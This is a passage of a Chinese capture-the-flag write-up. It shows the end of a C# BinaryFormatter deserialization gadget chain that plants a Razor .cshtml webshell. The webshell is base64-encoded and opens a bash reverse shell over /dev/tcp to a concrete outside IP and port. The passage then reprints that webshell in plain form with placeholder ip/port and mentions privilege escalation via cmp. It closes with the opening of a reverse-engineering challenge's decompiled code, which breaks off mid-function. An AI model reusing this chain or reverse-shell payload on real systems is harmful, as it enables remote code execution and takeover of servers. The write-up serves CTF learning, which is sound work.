</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>string</span><span class=w> </span><span class=n>base64String</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;QHsKICAgIExheW91dCA9IG51bGw7CiAgICBzdHJpbmcgb3V0cHV0ID0gIiI7CiAgICB0cnkKICAgIHsKICAgICAgICB2YXIgcHJvY2Vzc0Fzc2VtYmx5ID0gU3lzdGVtLlJlZmxlY3Rpb24uQXNzZW1ibHkuTG9hZCgiU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MiKTsKICAgICAgICB2YXIgcHNpVHlwZSA9IHByb2Nlc3NBc3NlbWJseS5HZXRUeXBlKCJTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2Vzc1N0YXJ0SW5mbyIpOwogICAgICAgIHZhciBwcm9jZXNzVHlwZSA9IHByb2Nlc3NBc3NlbWJseS5HZXRUeXBlKCJTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcyIpOwogICAgICAgIHZhciBwc2kgPSBTeXN0ZW0uQWN0aXZhdG9yLkNyZWF0ZUluc3RhbmNlKHBzaVR5cGUpOwogICAgICAgIHBzaVR5cGUuR2V0UHJvcGVydHkoIkZpbGVOYW1lIikuU2V0VmFsdWUocHNpLCAiYmFzaCIpOwogICAgICAgIHBzaVR5cGUuR2V0UHJvcGVydHkoIkFyZ3VtZW50cyIpLlNldFZhbHVlKHBzaSwgIi1jIFwiYmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMjIuNTEuMTM3Lzk5OTkgMD4mMVwiIik7CiAgICAgICAgcHNpVHlwZS5HZXRQcm9wZXJ0eSgiUmVkaXJlY3RTdGFuZGFyZE91dHB1dCIpLlNldFZhbHVlKHBzaSwgdHJ1ZSk7CiAgICAgICAgcHNpVHlwZS5HZXRQcm9wZXJ0eSgiUmVkaXJlY3RTdGFuZGFyZEVycm9yIikuU2V0VmFsdWUocHNpLCB0cnVlKTsKICAgICAgICBwc2lUeXBlLkdldFByb3BlcnR5KCJVc2VTaGVsbEV4ZWN1dGUiKS5TZXRWYWx1ZShwc2ksIGZhbHNlKTsKICAgICAgICBwc2lUeXBlLkdldFByb3BlcnR5KCJDcmVhdGVOb1dpbmRvdyIpLlNldFZhbHVlKHBzaSwgdHJ1ZSk7CiAgICAgICAgdmFyIHN0YXJ0TWV0aG9kID0gcHJvY2Vzc1R5cGUuR2V0TWV0aG9kKCJTdGFydCIsIG5ld1tdIHsgcHNpVHlwZSB9KTsKICAgICAgICB2YXIgcHJvY2VzcyA9IHN0YXJ0TWV0aG9kLkludm9rZShudWxsLCBuZXcgb2JqZWN0W10geyBwc2kgfSk7CiAgICAgICAgdmFyIHN0ZE91dFByb3BlcnR5ID0gcHJvY2Vzc1R5cGUuR2V0UHJvcGVydHkoIlN0YW5kYXJkT3V0cHV0Iik7CiAgICAgICAgdmFyIHN0ZE91dFJlYWRlciA9IChTeXN0ZW0uSU8uU3RyZWFtUmVhZGVyKXN0ZE91dFByb3BlcnR5LkdldFZhbHVlKHByb2Nlc3MpOwogICAgICAgCiAgICAgICAgb3V0cHV0ID0gc3RkT3V0UmVhZGVyLlJlYWRUb0VuZCgpOwoKICAgICAgICB2YXIgc3RkRXJyUHJvcGVydHkgPSBwcm9jZXNzVHlwZS5HZXRQcm9wZXJ0eSgiU3RhbmRhcmRFcnJvciIpOwogICAgICAgIHZhciBzdGRFcnJSZWFkZXIgPSAoU3lzdGVtLklPLlN0cmVhbVJlYWRlcilzdGRFcnJQcm9wZXJ0eS5HZXRWYWx1ZShwcm9jZXNzKTsKICAgICAgICBzdHJpbmcgZXJyb3JPdXRwdXQgPSBzdGRFcnJSZWFkZXIuUmVhZFRvRW5kKCk7CgogICAgICAgIHZhciB3YWl0Rm9yRXhpdE1ldGhvZCA9IHByb2Nlc3NUeXBlLkdldE1ldGhvZCgiV2FpdEZvckV4aXQiLCBTeXN0ZW0uVHlwZS5FbXB0eVR5cGVzKTsKICAgICAgICB3YWl0Rm9yRXhpdE1ldGhvZC5JbnZva2UocHJvY2VzcywgbnVsbCk7CgogICAgICAgIGlmICghc3RyaW5nLklzTnVsbE9yV2hpdGVTcGFjZShlcnJvck91dHB1dCkpCiAgICAgICAgewogICAgICAgICAgICBvdXRwdXQgKz0gIlxuW3N0ZGVycl1cbiIgKyBlcnJvck91dHB1dDsKICAgICAgICB9CiAgICB9CiAgICBjYXRjaCAoRXhjZXB0aW9uIGV4KQogICAgewogICAgICAgIG91dHB1dCA9ICLpgJrov4flj43lsITmiafooYzlkb3ku6Tml7blh7rplJk6XG4iICsgZXguVG9TdHJpbmcoKTsKICAgIH0KfQo8cHJlPkBvdXRwdXQ8L3ByZT4=&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>bytes</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Convert</span><span class=p>.</span><span class=na>FromBase64String</span><span class=p>(</span><span class=n>base64String</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>string</span><span class=w> </span><span class=n>payload</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>System</span><span class=p>.</span><span class=na>Text</span><span class=p>.</span><span class=na>Encoding</span><span class=p>.</span><span class=na>UTF8</span><span class=p>.</span><span class=na>GetString</span><span class=p>(</span><span class=n>bytes</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>var</span><span class=w> </span><span class=n>invokerTransformer0</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>InvokeTransformer</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>methodName</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;SetMyClass&#34;</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>methodParam</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>object</span><span class=o>[]</span><span class=w> </span><span class=p>{</span><span class=w> </span><span class=s>&#34;System.IO.File, System.IO.FileSystem&#34;</span><span class=w> </span><span class=p>},</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>typeName</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;ClassLibrary1.CompareImpl`1[System.String], ClassLibrary1&#34;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>};</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>var</span><span class=w> </span><span class=n>invokerTransformer1</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>InvokeTransformer</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>methodName</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;SetMyMethod&#34;</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>methodParam</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>object</span><span class=o>[]</span><span class=w> </span><span class=p>{</span><span class=w> </span><span class=s>&#34;WriteAllText&#34;</span><span class=w> </span><span class=p>},</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>typeName</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;ClassLibrary1.CompareImpl`1[System.String], ClassLibrary1&#34;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>};</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>var</span><span class=w> </span><span class=n>invokeTransformer</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>InvokeTransformer</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>methodName</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;MyCompare&#34;</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>methodParam</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>object</span><span class=o>[]</span><span class=w> </span><span class=p>{</span><span class=w> </span><span class=s>&#34;/app/Looking/My/Eyes.cshtml&#34;</span><span class=p>,</span><span class=n>payload</span><span class=p>,</span><span class=w> </span><span class=s>&#34;w1ndc0me&#34;</span><span class=w> </span><span class=p>},</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>typeName</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;ClassLibrary1.CompareImpl`1[System.String], ClassLibrary1&#34;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>};</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>var</span><span class=w> </span><span class=n>chainedTransformer</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ChainedTransformer</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>SetPrivateField</span><span class=p>(</span><span class=n>chainedTransformer</span><span class=p>,</span><span class=w> </span><span class=s>&#34;_transformers&#34;</span><span class=p>,</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>InvokeTransformer</span><span class=o>[]</span><span class=w> </span><span class=p>{</span><span class=w> </span><span class=n>invokerTransformer0</span><span class=p>,</span><span class=w> </span><span class=n>invokerTransformer1</span><span class=p>,</span><span class=w> </span><span class=n>invokeTransformer</span><span class=w> </span><span class=p>});</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>var</span><span class=w> </span><span class=n>indirectBean</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>IndirectBean</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>SetPrivateField</span><span class=p>(</span><span class=n>indirectBean</span><span class=p>,</span><span class=w> </span><span class=s>&#34;_transform&#34;</span><span class=p>,</span><span class=w> </span><span class=n>chainedTransformer</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>SetPrivateField</span><span class=p>(</span><span class=n>indirectBean</span><span class=p>,</span><span class=w> </span><span class=s>&#34;bean&#34;</span><span class=p>,</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>CompareImpl</span><span class=o>&lt;</span><span class=n>string</span><span class=o>&gt;</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>var</span><span class=w> </span><span class=n>entryPointBean</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>DirectBean</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>SetPrivateField</span><span class=p>(</span><span class=n>entryPointBean</span><span class=p>,</span><span class=w> </span><span class=s>&#34;s&#34;</span><span class=p>,</span><span class=w> </span><span class=n>indirectBean</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>var</span><span class=w> </span><span class=n>formatter</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>BinaryFormatter</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>using</span><span class=w> </span><span class=p>(</span><span class=kd>var</span><span class=w> </span><span class=n>stream</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>MemoryStream</span><span class=p>())</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>formatter</span><span class=p>.</span><span class=na>Serialize</span><span class=p>(</span><span class=n>stream</span><span class=p>,</span><span class=w> </span><span class=n>entryPointBean</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>return</span><span class=w> </span><span class=n>Convert</span><span class=p>.</span><span class=na>ToBase64String</span><span class=p>(</span><span class=n>stream</span><span class=p>.</span><span class=na>ToArray</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>SetPrivateField</span><span class=p>(</span><span class=n>object</span><span class=w> </span><span class=n>obj</span><span class=p>,</span><span class=w> </span><span class=n>string</span><span class=w> </span><span class=n>fieldName</span><span class=p>,</span><span class=w> </span><span class=n>object</span><span class=w> </span><span class=n>value</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Type</span><span class=w> </span><span class=n>type</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>obj</span><span class=p>.</span><span class=na>GetType</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>BindingFlags</span><span class=w> </span><span class=n>flags</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>BindingFlags</span><span class=p>.</span><span class=na>NonPublic</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>BindingFlags</span><span class=p>.</span><span class=na>Instance</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>FieldInfo</span><span class=w> </span><span class=n>field</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>type</span><span class=p>.</span><span class=na>GetField</span><span class=p>(</span><span class=n>fieldName</span><span class=p>,</span><span class=w> </span><span class=n>flags</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>field</span><span class=p>.</span><span class=na>SetValue</span><span class=p>(</span><span class=n>obj</span><span class=p>,</span><span class=w> </span><span class=n>value</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>需要注意这里利用的是cshtml，由于系统是编译之后的，所以需要反射调用恶意dll</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Java data-lang=Java><span class=line><span class=cl><span class=err>@</span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>Layout</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=kc>null</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>string</span><span class=w> </span><span class=n>output</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>try</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>var</span><span class=w> </span><span class=n>processAssembly</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>System</span><span class=p>.</span><span class=na>Reflection</span><span class=p>.</span><span class=na>Assembly</span><span class=p>.</span><span class=na>Load</span><span class=p>(</span><span class=s>&#34;System.Diagnostics.Process&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>var</span><span class=w> </span><span class=n>psiType</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>processAssembly</span><span class=p>.</span><span class=na>GetType</span><span class=p>(</span><span class=s>&#34;System.Diagnostics.ProcessStartInfo&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>var</span><span class=w> </span><span class=n>processType</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>processAssembly</span><span class=p>.</span><span class=na>GetType</span><span class=p>(</span><span class=s>&#34;System.Diagnostics.Process&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>var</span><span class=w> </span><span class=n>psi</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>System</span><span class=p>.</span><span class=na>Activator</span><span class=p>.</span><span class=na>CreateInstance</span><span class=p>(</span><span class=n>psiType</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>psiType</span><span class=p>.</span><span class=na>GetProperty</span><span class=p>(</span><span class=s>&#34;FileName&#34;</span><span class=p>).</span><span class=na>SetValue</span><span class=p>(</span><span class=n>psi</span><span class=p>,</span><span class=w> </span><span class=s>&#34;bash&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>psiType</span><span class=p>.</span><span class=na>GetProperty</span><span class=p>(</span><span class=s>&#34;Arguments&#34;</span><span class=p>).</span><span class=na>SetValue</span><span class=p>(</span><span class=n>psi</span><span class=p>,</span><span class=w> </span><span class=s>&#34;-c \&#34;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1\&#34;&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>psiType</span><span class=p>.</span><span class=na>GetProperty</span><span class=p>(</span><span class=s>&#34;RedirectStandardOutput&#34;</span><span class=p>).</span><span class=na>SetValue</span><span class=p>(</span><span class=n>psi</span><span class=p>,</span><span class=w> </span><span class=kc>true</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>psiType</span><span class=p>.</span><span class=na>GetProperty</span><span class=p>(</span><span class=s>&#34;RedirectStandardError&#34;</span><span class=p>).</span><span class=na>SetValue</span><span class=p>(</span><span class=n>psi</span><span class=p>,</span><span class=w> </span><span class=kc>true</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>psiType</span><span class=p>.</span><span class=na>GetProperty</span><span class=p>(</span><span class=s>&#34;UseShellExecute&#34;</span><span class=p>).</span><span class=na>SetValue</span><span class=p>(</span><span class=n>psi</span><span class=p>,</span><span class=w> </span><span class=kc>false</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>psiType</span><span class=p>.</span><span class=na>GetProperty</span><span class=p>(</span><span class=s>&#34;CreateNoWindow&#34;</span><span class=p>).</span><span class=na>SetValue</span><span class=p>(</span><span class=n>psi</span><span class=p>,</span><span class=w> </span><span class=kc>true</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>var</span><span class=w> </span><span class=n>startMethod</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>processType</span><span class=p>.</span><span class=na>GetMethod</span><span class=p>(</span><span class=s>&#34;Start&#34;</span><span class=p>,</span><span class=w> </span><span class=k>new</span><span class=o>[]</span><span class=w> </span><span class=p>{</span><span class=w> </span><span class=n>psiType</span><span class=w> </span><span class=p>});</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>var</span><span class=w> </span><span class=n>process</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>startMethod</span><span class=p>.</span><span class=na>Invoke</span><span class=p>(</span><span class=kc>null</span><span class=p>,</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>object</span><span class=o>[]</span><span class=w> </span><span class=p>{</span><span class=w> </span><span class=n>psi</span><span class=w> </span><span class=p>});</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>var</span><span class=w> </span><span class=n>stdOutProperty</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>processType</span><span class=p>.</span><span class=na>GetProperty</span><span class=p>(</span><span class=s>&#34;StandardOutput&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>var</span><span class=w> </span><span class=n>stdOutReader</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>System</span><span class=p>.</span><span class=na>IO</span><span class=p>.</span><span class=na>StreamReader</span><span class=p>)</span><span class=n>stdOutProperty</span><span class=p>.</span><span class=na>GetValue</span><span class=p>(</span><span class=n>process</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>output</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>stdOutReader</span><span class=p>.</span><span class=na>ReadToEnd</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>var</span><span class=w> </span><span class=n>stdErrProperty</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>processType</span><span class=p>.</span><span class=na>GetProperty</span><span class=p>(</span><span class=s>&#34;StandardError&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>var</span><span class=w> </span><span class=n>stdErrReader</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>System</span><span class=p>.</span><span class=na>IO</span><span class=p>.</span><span class=na>StreamReader</span><span class=p>)</span><span class=n>stdErrProperty</span><span class=p>.</span><span class=na>GetValue</span><span class=p>(</span><span class=n>process</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>string</span><span class=w> </span><span class=n>errorOutput</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>stdErrReader</span><span class=p>.</span><span class=na>ReadToEnd</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>var</span><span class=w> </span><span class=n>waitForExitMethod</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>processType</span><span class=p>.</span><span class=na>GetMethod</span><span class=p>(</span><span class=s>&#34;WaitForExit&#34;</span><span class=p>,</span><span class=w> </span><span class=n>System</span><span class=p>.</span><span class=na>Type</span><span class=p>.</span><span class=na>EmptyTypes</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>waitForExitMethod</span><span class=p>.</span><span class=na>Invoke</span><span class=p>(</span><span class=n>process</span><span class=p>,</span><span class=w> </span><span class=kc>null</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=o>!</span><span class=n>string</span><span class=p>.</span><span class=na>IsNullOrWhiteSpace</span><span class=p>(</span><span class=n>errorOutput</span><span class=p>))</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>output</span><span class=w> </span><span class=o>+=</span><span class=w> </span><span class=s>&#34;\n[stderr]\n&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>errorOutput</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>Exception</span><span class=w> </span><span class=n>ex</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>output</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;通过反射执行命令时出错:\n&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>ex</span><span class=p>.</span><span class=na>ToString</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>&lt;</span><span class=n>pre</span><span class=o>&gt;</span><span class=nd>@output</span><span class=o>&lt;/</span><span class=n>pre</span><span class=o>&gt;</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>出题人还设置了一个坑点，在反序列化的时候过滤了，使用了return null这样是没用的。</p><p><img src=https://su-team.cn/img/2025-L3HCTF/9171acd8-b3f4-489e-b563-975875b31e8c.png alt=img></p><p>rce之后，需要用cmp进行提权。</p><p><a href=https://gtfobins.github.io/gtfobins/cmp/>https://gtfobins.github.io/gtfobins/cmp/</a></p><h1 id=reverse>Reverse</h1><h2 id=temporalparadox>TemporalParadox</h2><p>main开头有花指令，nop掉跳转jmp即可反编译。动态调试跑一轮就知道各个函数的功能</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-C++ data-lang=C++><span class=line><span class=cl><span class=kr>__int64</span> <span class=kr>__fastcall</span> <span class=nf>sub_140001D05</span><span class=p>(</span><span class=kr>__int64</span> <span class=n>a1</span><span class=p>,</span> <span class=kr>__int64</span> <span class=n>a2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=c1>// [COLLAPSED LOCAL DECLARATIONS. PRESS NUMPAD &#34;+&#34; TO EXPAND]
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=n>sub_140002180</span><span class=p>(</span><span class=n>a1</span><span class=p>,</span> <span class=n>a2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>sub_14000A510</span><span class=p>(</span><span class=n>a1</span><span class=p>,</span> <span class=n>a2</span><span class=p>,</span> <span class=n>v2</span><span class=p>,</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>int</span><span class=p>)</span><span class=n>v53</span><span class=p>,</span> <span class=n>v3</span><span class=p>,</span> <span class=n>v4</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>v58</span> <span class=o>=</span> <span class=n>get_time</span><span class=p>(</span><span class=n>a1</span><span class=p>,</span> <span class=n>a2</span><span class=p>,</span> <span class=n>v5</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=n>v6</span><span class=p>,</span> <span class=n>v7</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=n>v58</span> <span class=o>&gt;</span> <span class=mi>1751990400</span> <span class=o>&amp;&amp;</span> <span class=n>v58</span> <span class=o>&lt;=</span> <span class=mi>1752052051</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
